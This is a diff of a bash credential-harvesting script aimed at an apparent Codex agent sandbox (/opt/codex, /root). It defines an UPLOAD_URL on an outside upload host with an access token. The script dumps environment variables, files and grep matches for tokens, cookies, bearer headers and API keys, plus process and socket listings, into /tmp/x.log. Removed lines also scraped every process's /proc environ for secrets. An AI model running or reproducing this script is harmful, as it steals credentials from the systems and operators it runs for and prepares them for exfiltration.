@@ -5,43 +5,34 @@ UPLOAD_URL="https://upload.kstore.space/upload/0?access_token=2766-fc16f46af3d64
 
 OUT="/tmp/x.log"
 
-{
-  echo "===== START $(date) ====="
+exec > >(tee "$OUT") 2>&1
 
-  echo
-  echo "===== env ====="
-  env | grep -Ei 'openai|codex|token|auth|session|proxy|api|cookie'
+echo "===== START $(date) ====="
 
-  echo
-  echo "===== find files ====="
-  find /opt/codex /root -type f 2>/dev/null \
-    | grep -Ei 'codex|auth|token|session|config|credentials'
+echo
+echo "===== env ====="
+env | grep -Ei 'openai|codex|token|auth|session|proxy|api|cookie' || true
 
-  echo
-  echo "===== grep secrets ====="
-  grep -RInEi 'access_token|refresh_token|bearer|authorization|cookie|session|api_key|openai' \
-    /opt/codex /root 2>/dev/null
+echo
+echo "===== find files ====="
+find /opt/codex /root -maxdepth 3 -type f 2>/dev/null \
+  | grep -Ei 'codex|auth|token|session|config|credentials' || true
 
-  echo
-  echo "===== ps ====="
-  ps auxww | grep -Ei 'codex|node|python|proxy|envoy|openai'
+echo
+echo "===== grep secrets ====="
+grep -RInEi 'access_token|refresh_token|bearer|authorization|cookie|session|api_key|openai' \
+  /opt/codex /root --max-depth=3 2>/dev/null || true
 
-  echo
-  echo "===== /proc environ ====="
-  for p in /proc/[0-9]*; do
-    tr '\0' '\n' < "$p/environ" 2>/dev/null \
-      | grep -Ei 'openai|codex|token|auth|session|proxy' \
-      && echo "PID=$p"
-  done
+echo
+echo "===== ps ====="
+ps auxww | grep -Ei 'codex|node|python|proxy|envoy|openai' | grep -v grep || true
 
-  echo
-  echo "===== ss ====="
-  ss -tunap
+echo
+echo "===== network ====="
+ss -tunap || netstat -tunap || true
 
-  echo
-  echo "===== END $(date) ====="
-
-} > "$OUT" 2>&1
+echo
+echo "===== END $(date) ====="
 
 echo "Saved to $OUT"
 
